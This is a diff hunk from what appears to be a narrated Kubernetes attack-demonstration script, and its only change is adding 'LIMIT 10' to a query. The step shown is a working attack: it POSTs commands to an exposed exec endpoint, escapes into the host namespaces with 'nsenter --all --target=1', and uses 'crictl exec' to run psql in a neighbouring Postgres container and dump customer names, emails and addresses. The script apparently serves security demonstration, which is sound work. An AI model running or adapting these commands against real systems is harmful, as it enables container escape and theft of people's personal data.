@@ -77,9 +77,9 @@ sleep 15
 echo "7. Exfiltrating some data from another container running on the same Node (a Postgres database in the postgres-sakila Namespace) with crictl"
 echo "--------------------------------------------------------------------------------"
 POSTGRES_ID=$(curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d 'command=nsenter --all --target=1 crictl ps --name postgres-sakila -q')
-echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c \'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id)\'\""
+echo "Running curl -s -X POST $NODE_IP:$NODE_PORT/exec -d \"command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c \'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id) LIMIT 10\'\""
 echo "---"
-curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c 'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id)'"
+curl --connect-timeout 5 -s -X POST $NODE_IP:$NODE_PORT/exec -d "command=nsenter --all --target=1 crictl exec $POSTGRES_ID psql -U postgres -c 'SELECT c.first_name, c.last_name, c.email, a.address, a.postal_code FROM customer c JOIN address a ON (c.address_id = a.address_id) LIMIT 10'"
 echo "--------------------------------------------------------------------------------"
 sleep 15
 
